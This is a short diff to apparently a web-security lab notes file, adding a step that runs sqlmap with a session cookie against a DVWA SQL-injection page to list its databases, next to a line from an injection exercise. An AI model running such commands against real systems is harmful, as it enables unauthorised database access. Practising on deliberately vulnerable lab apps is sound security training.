@@ -233,3 +233,10 @@ java -jar webgoat-server-nnnn.jar --server.port=9090
 grant alter table to UnauthorizedUser
 ```
 
+## SQLMap
+- Find request URL vulnerable to SQL injection and find its corresponding cookie value
+- Run SQLmap on the following command:
+
+```
+sudo sqlmap -u "http//Win10-IP/dvwa-master/vulnerabilties/sqli/?id=3&Submit=Submit" --cookie="security=low;PHPSESSID=ab6iiicumjdbjkmun4cphkdmvo" --dbs
+```
